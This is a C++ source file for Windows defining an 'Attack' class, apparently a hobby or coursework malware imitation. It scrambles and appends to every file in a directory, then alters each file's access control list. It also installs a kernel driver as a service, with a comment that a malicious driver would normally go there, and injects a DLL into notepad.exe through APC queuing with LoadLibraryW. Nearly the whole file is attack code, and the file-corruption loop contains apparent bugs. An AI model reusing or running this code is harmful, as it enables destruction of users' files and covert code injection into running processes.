#include "attack.h"

void Attack::SetFilePermission(LPCWSTR filename)
{
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	EXPLICIT_ACCESS ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	// create a well-known SID for the everyone group
	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0, &pEveryoneSID);

	// initialize an EXPLICIT_ACCESS structure for ACE
	ZeroMemory(&ea, 1 * sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = SPECIFIC_RIGHTS_ALL;
	ea[0].grfAccessMode = GRANT_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPCH)pEveryoneSID;

	// Create a new ACL that contains the new ACEs
	SetEntriesInAcl(1, ea, NULL, &pACL);

	// Initialize a security descriptor
	PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);

	// Add the ACL to the security descriptor 
	SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE); // not a default DACL

													   // Change the security attributes
	SetFileSecurity(filename, DACL_SECURITY_INFORMATION, pSD);

	if (pEveryoneSID)
	{
		FreeSid(pEveryoneSID);
	}
	if (pACL)
	{
		LocalFree(pACL);
	}
	if (pSD)
	{
		LocalFree(pSD);
	}
}

vector<wstring> Attack::list_n_kill_files(wstring path)
{
	vector<wstring> subdirs, matches;
	WIN32_FIND_DATA ffd;
	HANDLE hFind = FindFirstFile((_T(path) + L"\\*.*").c_str(), &ffd);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			wstring filename = _T(ffd.cFileName);
			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				wstring file_path = path + L"\\" + filename;
				matches.push_back(file_path);

				std::wcout << "Opening contents of " << filename << std::endl;

				// open file for writing
				std::ofstream outfile;
				if (outfile.fail())
				{
					std::wcout << "Can't open file " << filename << "!" << std::endl;
				}
				else {
					string readout;
					string replace;

					std::cout << "Writing to file..." << std::endl;
					// for read
					ifstream file_read(file_path);
					// for write
					outfile.open(file_path, std::ios::in | ::ios::out | std::ios::app);
					while (getline(file_read, readout))
					{
						std::cout << "Replacing line..." << std::endl;
						std::cout << readout << std::endl << std::endl;
						// replace each letter of word in file
						for (int i = 0; i < readout.length() + 1; i++)
						{
							// shift letters up one, power up 3
							replace += readout[i + 1 ^ 3];
						}
						// append replaced strings to file
						outfile << replace + "\n";
						replace.clear();
					}
					// set file permissions to admin if not admin : lock
					SetFilePermission(file_path.c_str());

					// close files
					file_read.close();
					outfile.close();
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);
		// now attack the file editor! notebook
		std::cout << "\nInjecting all writing processes" << std::endl;
		APCinjection("notepad.exe", (TCHAR *)"..\\..\\dll\\calc.dll");
	}
	else {
		std::cout << "Can't find files in directory" << std::endl;
	}
	FindClose(hFind);
	return matches;
}

void Attack::LoadDriverBeep()
{
	SC_HANDLE schSCManager, schService;

	// the driver location, normally we would bring on a malicious one
	// but this is a test one
	LPCTSTR lpszDriverPathName = L"%SystemRoot%\\system32\\drivers\\beep.sys";
	// service display name
	LPCTSTR lpszDisplayName = L"CustomBeep";
	// Registry Subkey
	LPCTSTR lpszServiceName = L"MyCustomBeep";

	// open handle to the SC Manager database
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); // full access rights

	if (NULL == schSCManager)
	{
		std::cout << "OpenSCManager() failed, error: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "OpenSCManager() loaded OK." << std::endl;
	}

	// Create/install service
	schService = CreateService(
		schSCManager,
		lpszServiceName,
		lpszDisplayName,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER, // find types /api/winsvc/nf-winsvc-createservicea
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		lpszDriverPathName,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (schService == NULL)
	{
		std::cout << "CreateService() failed, error: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "CreateService() for %S" << lpszServiceName << " loaded OK." << std::endl;
		if (CloseServiceHandle(schService) == 0)
		{
			std::cout << "CloseServiceHandle() failed, error: " << GetLastError() << std::endl;
		} 
		else {
			std::cout << "CloseServiceHandle() is OK." << std::endl;
		}
	}
}

BOOL FindProcess(string exeName, DWORD& pid, vector<DWORD>& tids)
{
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	pid = 0;

	PROCESSENTRY32 pe = { sizeof(pe) };
	if (::Process32First(hSnapshot, &pe))
	{
		do
		{
			string str(pe.szExeFile);
			if (pe.szExeFile == exeName)
			{
				pid = pe.th32ProcessID;
				THREADENTRY32 te = { sizeof(te) };
				if (Thread32First(hSnapshot, &te))
				{
					do
					{
						if (te.th32OwnerProcessID == pid)
						{
							tids.push_back(te.th32ThreadID);
						}
					} while (Thread32Next(hSnapshot, &te));
				}
				break;
			}
		} while (Process32Next(hSnapshot, &pe));
	}
	CloseHandle(hSnapshot);
	return pid > 0 && !tids.empty();
}

// Inject a DLL into a target without creating a remote process or thread, actually uses
// virtual memory
BOOL Attack::APCinjection(string target, TCHAR *dll_name)
{
	TCHAR lpdllpath[MAX_PATH];
	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);

	DWORD pid{};
	vector<DWORD> tids{};

	std::cout << "[ ] Finding matching process name.." << std::endl;
	if (!FindProcess(target, pid, tids))
	{
		std::cout << "[-] Failed to find process of " << target << std::endl;
		return FALSE;
	}

	std::cout << "[+] Found process   " << pid << std::endl;
	std::cout << "[ ] Opening process.." << std::endl;
	auto hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess)
	{
		std::cout << "[-] Failed to open process." << std::endl;
		return FALSE;
	}
	std::cout << "[+] Opened Process" << std::endl;

	std::cout << "[ ] Allocating memory into process.." << std::endl;
	auto pVa = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	std::cout << "[+] Allocated memory in remote process" << std::endl;
	std::cout << "[ ] Writing remote process memory.." << std::endl;
	if (!WriteProcessMemory(hProcess, pVa, lpdllpath, sizeof(lpdllpath), nullptr))
	{
		std::cout << "[-] Failed to write remote process memory." << std::endl;
		return FALSE;
	}
	std::cout << "[+] Wrote remote process memory." << std::endl;
	std::cout << "[ ] Enumerating APC threads in remote process.." << std::endl;
	for (const auto &tid : tids)
	{
		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
		if (hThread)
		{
			std::cout << "[*] Found thread at " << hThread << std::endl;
			QueueUserAPC(
				(PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"),
					"LoadLibraryW"),
				hThread,
				(ULONG_PTR)pVa
			);

			CloseHandle(hThread);
		}
	}
	CloseHandle(hProcess);
	return TRUE;
}